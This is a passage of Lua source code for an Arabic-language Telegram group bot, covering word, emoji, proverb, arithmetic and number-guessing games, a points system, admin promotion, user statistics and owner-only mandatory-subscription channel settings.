DevFeras:set(DevFeras..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'المعاني' and ChCheck(msg) or text == 'معاني' and ChCheck(msg) then
if not DevFeras:get(DevFeras..'bot:lock_geam'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevFeras:del(DevFeras..'bot:l:id'..msg.chat_id_)
DevFeras2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = DevFeras2[math.random(#DevFeras2)]
DevFeras:set(DevFeras..'bot:bkbk2'..msg.chat_id_,name)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
Feras_dev = '⌁︙ما معنى هذا السمايل :؟ ↫ '..name
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
end end
if text == ''..(DevFeras:get(DevFeras..'bot:bkbk2'..msg.chat_id_) or 'qssp')..'' and not DevFeras:get(DevFeras..'bot:l:id'..msg.chat_id_) then
if not DevFeras:get(DevFeras..'bot:l:id'..msg.chat_id_) then 
Feras_dev = '⌁︙لقد ربحت وحصلت على نقطه \n⌁︙ارسل ( المعاني ) للعب مره اخرى \n '
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
DevFeras:incrby(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevFeras:set(DevFeras..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'العكس' and ChCheck(msg) or text == 'عكس' and ChCheck(msg) then
if not DevFeras:get(DevFeras..'bot:lock_geam'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevFeras:del(DevFeras..'bot:l:id'..msg.chat_id_)
DevFeras2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = DevFeras2[math.random(#DevFeras2)]
DevFeras:set(DevFeras..'bot:bkbk3'..msg.chat_id_,name)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'محلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'حي','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
Feras_dev = '⌁︙ما هو عكس كلمة ↫ '..name
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
end end
if text == ''..(DevFeras:get(DevFeras..'bot:bkbk3'..msg.chat_id_) or 'qssp')..'' and not DevFeras:get(DevFeras..'bot:l:id'..msg.chat_id_) then
if not DevFeras:get(DevFeras..'bot:l:id'..msg.chat_id_) then 
Feras_dev = '⌁︙لقد ربحت وحصلت على نقطه \n⌁︙ارسل ( العكس ) للعب مره اخرى \n '
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
DevFeras:incrby(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevFeras:set(DevFeras..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'المختلف' and ChCheck(msg) or text == 'مختلف' and ChCheck(msg) then
if not DevFeras:get(DevFeras..'bot:lock_geam'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevFeras:del(DevFeras..'bot:l:id'..msg.chat_id_)
DevFeras2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧜‍♂','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕒','🕤','⌛️','📅',};
name = DevFeras2[math.random(#DevFeras2)]
DevFeras:set(DevFeras..'bot:bkbk4'..msg.chat_id_,name)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟⭐️🌟')
name = string.gsub(name,'📥','💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃️☃️☃️☃️⛄️☃️☃️☃️☃️')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀️','🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♀️🧚‍♂️🧚‍♂️')
name = string.gsub(name,'🧚‍♂️','🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♂️🧚‍♀️🧚‍♀️')
name = string.gsub(name,'🧝‍♂️','🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♂️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕓','🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📅📆📆')
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
Feras_dev = '⌁︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
end end
if text == ''..(DevFeras:get(DevFeras..'bot:bkbk4'..msg.chat_id_) or 'qssp')..'' and not DevFeras:get(DevFeras..'bot:l:id'..msg.chat_id_) then
if not DevFeras:get(DevFeras..'bot:l:id'..msg.chat_id_) then 
Feras_dev = '⌁︙لقد ربحت وحصلت على نقطه \n⌁︙ارسل ( المختلف ) للعب مره اخرى \n '
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
DevFeras:incrby(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevFeras:set(DevFeras..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'امثله' and ChCheck(msg) or text == 'الامثله' and ChCheck(msg) then
if not DevFeras:get(DevFeras..'bot:lock_geam'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevFeras2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = DevFeras2[math.random(#DevFeras2)]
DevFeras:set(DevFeras..'bot:bkbk5'..msg.chat_id_,name)
DevFeras:del(DevFeras..'bot:l:id'..msg.chat_id_)
name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل ___ ')
name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من ___ نعال')
name = string.gsub(name,'شقره','مع الخيل يا ___ ')
name = string.gsub(name,'النخله','الطول طول ___ والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر ___ ')
name = string.gsub(name,'الخيل','من قلة ___ شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني ___ ')
name = string.gsub(name,'المبلل',' ___ ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة ___ ')
name = string.gsub(name,'يركص','المايعرف ___ يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح ___ يكول حامض')
name = string.gsub(name,'العمه','___ إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي ___ للخباز حتى لو ياكل نصه')
name = string.gsub(name,'بالحصاد','اسمة ___ ومنجله مكسور')
name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من على الحاضر لكة')
name = string.gsub(name,'القرد',' ___ بعين امه غزال')
name = string.gsub(name,'يكحله','اجه ___ عماها')
Feras_dev = '⌁︙اكمل المثال التالي ↫ ['..name..']'
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
end end
if text == ''..(DevFeras:get(DevFeras..'bot:bkbk5'..msg.chat_id_) or 'qssp')..'' then
if not DevFeras:get(DevFeras..'bot:l:id'..msg.chat_id_) then 
DevFeras:incrby(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
DevFeras:del(DevFeras..'bot:bkbk5'..msg.chat_id_)
Feras_dev = '⌁︙لقد ربحت وحصلت على نقطه \n⌁︙ارسل ( امثله ) للعب مره اخرى \n '
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
end
DevFeras:set(DevFeras..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'رياضيات' and ChCheck(msg) or text == 'الرياضيات' and ChCheck(msg) then
if not DevFeras:get(DevFeras..'bot:lock_geam'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevFeras2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = DevFeras2[math.random(#DevFeras2)]
DevFeras:set(DevFeras..'bot:bkbk6'..msg.chat_id_,name)
DevFeras:del(DevFeras..'bot:l:id'..msg.chat_id_)
name = string.gsub(name,'9','7 + 2 = ?')
name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?')
name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?')
name = string.gsub(name,'4','40 ÷ 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?')
name = string.gsub(name,'10','100 ÷ 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?')
name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?')
name = string.gsub(name,'5','12 + 1 - 8 = ?')
name = string.gsub(name,'16','16 + 16 - 16 = ?')
Feras_dev = '⌁︙اكمل المعادله التاليه \n{'..name..'} '
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
end end
if text == ''..(DevFeras:get(DevFeras..'bot:bkbk6'..msg.chat_id_) or 'qssp')..'' then
if not DevFeras:get(DevFeras..'bot:l:id'..msg.chat_id_) then 
DevFeras:incrby(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
DevFeras:del(DevFeras..'bot:bkbk6'..msg.chat_id_)
Feras_dev = '⌁︙لقد ربحت وحصلت على نقطه \n⌁︙ارسل ( رياضيات ) للعب مره اخرى \n '
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
end
DevFeras:set(DevFeras..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'الانكليزي' and ChCheck(msg) or text == 'الانجليزيه' and ChCheck(msg) or text == 'انجليزيه' and ChCheck(msg) then
if not DevFeras:get(DevFeras..'bot:lock_geam'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevFeras2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
name = DevFeras2[math.random(#DevFeras2)]
DevFeras:set(DevFeras..'bot:bkbk7'..msg.chat_id_,name)
DevFeras:del(DevFeras..'bot:l:id'..msg.chat_id_)
name = string.gsub(name,'ذئب','Wolf')
name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','Channels')
name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book')
name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'نقود','money')
name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile')
name = string.gsub(name,'شاطئ','Beach')
name = string.gsub(name,'غبي','Stupid')
name = string.gsub(name,'صداقه','Friendchip')
Feras_dev = '⌁︙ما معنى كلمة ↫ '..name
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
end end
if text == ''..(DevFeras:get(DevFeras..'bot:bkbk7'..msg.chat_id_) or 'qssp')..'' then
if not DevFeras:get(DevFeras..'bot:l:id'..msg.chat_id_) then 
DevFeras:incrby(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
DevFeras:del(DevFeras..'bot:bkbk7'..msg.chat_id_)
Feras_dev = '⌁︙لقد ربحت وحصلت على نقطه \n⌁︙ارسل ( انجليزيه ) للعب مره اخرى \n '
Dev_Feras(msg.chat_id_, msg.id_, 1,Feras_dev, 1, 'md')
end
DevFeras:set(DevFeras..'bot:l:id'..msg.chat_id_,true)
end  
--     Source DevFeras     --
if DevFeras:get(DevFeras.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_Feras(msg.chat_id_, msg.id_, 1,"⌁︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevFeras:get(DevFeras.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevFeras:del(DevFeras..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevFeras:del(DevFeras.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
DevFeras:incrby(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙*التخمين الصحيح هو* ↫ '..NUM..'\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevFeras:incrby(DevFeras..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevFeras:get(DevFeras..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevFeras:del(DevFeras..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevFeras:del(DevFeras.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n⌁︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevFeras:get(DevFeras..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevFeras:get(DevFeras..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'محاوله واحده فقط'
end
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
end
end
end
end
if text == 'خمن' and ChCheck(msg) or text == 'تخمين' and ChCheck(msg) then   
if not DevFeras:get(DevFeras..'bot:lock_geam'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
Num = math.random(1,20)
DevFeras:set(DevFeras.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n⌁︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevFeras:setex(DevFeras.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source DevFeras     --
if text == 'الالعاب' and ChCheck(msg) or text == 'العاب' and ChCheck(msg) or text == 'اللعبه' and ChCheck(msg) then
if not DevFeras:get(DevFeras..'bot:lock_geam'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙عذرا الالعاب معطله في المجموعه', 1, 'md')
else
Dev_Feras(msg.chat_id_, msg.id_, 1,[[
⌁︙قائمة العاب المجموعه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙لعبة التخمين ↫ خمن
⌁︙لعبة الامثله ↫ امثله
⌁︙لعبة العكس ↫ العكس
⌁︙لعبة الحزوره ↫ حزوره
⌁︙لعبة الترتيب ↫ ترتيب
⌁︙لعبة المعاني ↫ معاني
⌁︙لعبة المختلف ↫ المختلف
⌁︙لعبة السمايلات ↫ سمايلات
⌁︙لعبة المحيبس ↫ المحيبس
⌁︙لعبة الرياضيات ↫ رياضيات
⌁︙لعبة الانجليزيه ↫ انجليزيه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙نقاطي • بيع نقاطي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://T.ME/DevFeras)
]], 1, 'md')
end
end
--     Source DevFeras     --
if text == 'بيع نقاطي' and ChCheck(msg) then
if tonumber((DevFeras:get(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙ليس لديك نقاط العب اولا\n⌁︙ارسل ( الالعاب ) للعب', 1, 'md')
else
DevFeras0 = (DevFeras:get(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) * 50)
DevFeras:incrby(DevFeras..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_,DevFeras0)
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙تم بيع '..(DevFeras:get(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n⌁︙كل نقطه تساوي 50 رساله', 'md')
DevFeras:del(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source DevFeras     --
if text == 'رفع المشرفين' and ChCheck(msg) or text == 'رفع الادمنيه' and ChCheck(msg) then  
local function promote_admin(extra, result, success)  
DevFeras:del(DevFeras..'abs:absmonsh:'..msg.chat_id_)
local num = 0
local admins = result.members_  
for i=0 , #admins do   
if result.members_[i].bot_info_ == false and result.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevFeras:sadd(DevFeras..'abs:admins:'..msg.chat_id_, admins[i].user_id_)   
num = num + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,dp) 
if dp.first_name_ == false then
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, admins[i].user_id_)   
end
end,nil)   
else
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, admins[i].user_id_)   
end 
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then  
owner_id = admins[i].user_id_  
DevFeras:sadd(DevFeras..'abs:monsh:'..msg.chat_id_,owner_id)  
DevFeras:sadd(DevFeras..'abs:absmonsh:'..msg.chat_id_,owner_id)   
end  
end  
if num == 0 then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙لا يوجد ادمنيه ليتم رفعهم\n⌁︙تم رفع منشئ المجموعه", 1, 'md')
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم رفع '..num..' من الادمنيه \n⌁︙تم رفع منشئ المجموعه', 1, 'md')
end
end
getChannelMembers(msg.chat_id_,0, 'Administrators', 100, promote_admin)
end
--     Source DevFeras     --
if text == 'غادر' and SudoBot(msg.sender_user_id_, msg.chat_id_) then
if DevFeras:get(DevFeras.."Left:Bot"..bot_id) and not Sudo(msg) then
Dev_Feras(msg.chat_id_,msg.id_, 1, "⌁︙المغادره معطله من قبل المطور الاساسي", 1, 'md')
return false  
end
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم مغادرة المجموعه \n⌁︙تم حذف جميع بياناتها ', 1, 'md')
chat_leave(msg.chat_id_, bot_id)
DevFeras:srem(DevFeras.."bot:groups",msg.chat_id_)
end
--     Source DevFeras     --
if text ==('موقعي') and ChCheck(msg) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'عضو'
end
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙موقعك ↫ '..rtpa, 1, 'md')
end,nil)
end
--     Source DevFeras     --
if text:match("^معلوماتي$") and ChCheck(msg) then
function get_me(extra,result,success)
local msguser = tonumber(DevFeras:get(DevFeras..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevFeras:get(DevFeras..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevFeras:get(DevFeras..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevFeras:get(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local text = (tonumber(DevFeras:get(DevFeras.."text:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local sticker = (tonumber(DevFeras:get(DevFeras.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Photo = (tonumber(DevFeras:get(DevFeras.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Voice = (tonumber(DevFeras:get(DevFeras.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Audio = (tonumber(DevFeras:get(DevFeras.."Audio:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Gif = (tonumber(DevFeras:get(DevFeras.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Video = (tonumber(DevFeras:get(DevFeras.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙اسمك ↫ ❨ ['..result.first_name_..'] ❩\n⌁︙معرفك ↫ ❨ ['..username..'] ❩\n⌁︙ايديك ↫ ❨ `'..result.id_..'` ❩\n⌁︙نقاطك ↫ ❨ '..user_nkt..' ❩\n⌁︙رسائلك ↫ ❨ '..user_msgs..' ❩\n⌁︙ملصقاتك ↫ ❨ '..sticker..' ❩\n⌁︙المتحركه ↫ ❨ '..Gif..' ❩\n⌁︙صورك ↫ ❨ '..Photo..' ❩\n⌁︙بصماتك ↫ ❨ '..Voice..' ❩\n⌁︙اغانيك ↫ ❨ '..Audio..' ❩\n⌁︙فيديوهاتك ↫ ❨ '..Video..' ❩\n⌁︙جهاتك ↫ ❨ '..cont..' ❩\n⌁︙تفاعلك ↫ '..formsgs(msguser)..'\n⌁︙رتبتك ↫ '..id_rank(msg), 1, 'md')
end
getUser(msg.sender_user_id_,get_me)
end
end
--     Source DevFeras     --
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" or text == "تعيين الاشتراك الاجباري" or text == "وضع قناة الاشتراك" then
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
DevFeras:setex(DevFeras..'DevFeras4'..msg.sender_user_id_,300,true)
Dev_Feras(msg.chat_id_,msg.id_, 1, "⌁︙*ارسل لي معرف قناة الاشتراك الان*", 1 , "md")
end end
if text == "حذف قناة الاشتراك" and Sudo(msg) or text == "حذف قناه الاشتراك" and Sudo(msg) then  
DevFeras:del(DevFeras..'DevFeras3')
DevFeras:del(DevFeras.."DevFeras2")
text = "⌁︙تم حذف قناة الاشتراك الاجباري"
Dev_Feras(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == 'تفعيل الاشتراك الاجباري' then
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
if not DevFeras:get(DevFeras..'DevFeras3') then
Dev_Feras(msg.chat_id_,msg.id_, 1, "⌁︙لم يتم تعيين قناة الاشتراك الاجباري \n⌁︙ارسل (تعيين قناة الاشتراك) للتعيين ", 1 , "md")
return false 
end
if DevFeras:get(DevFeras..'DevFeras3') then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الاشتراك الاجباري'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras.."DevFeras2", true)
return false end end end
if text == 'تعطيل الاشتراك الاجباري' then
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الاشتراك الاجباري'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras.."DevFeras2")
return false 
end end
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' then
if not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
else
local DevFeras5 = DevFeras:get(DevFeras.."DevFeras3")
if DevFeras5 then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙قناة الاشتراك ↫ '..DevFeras5..'', 1, 'html')
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لم يتم تعيين قناة الاشتراك الاجباري \n⌁︙ارسل (تعيين قناة الاشتراك) للتعيين ', 1, 'md')
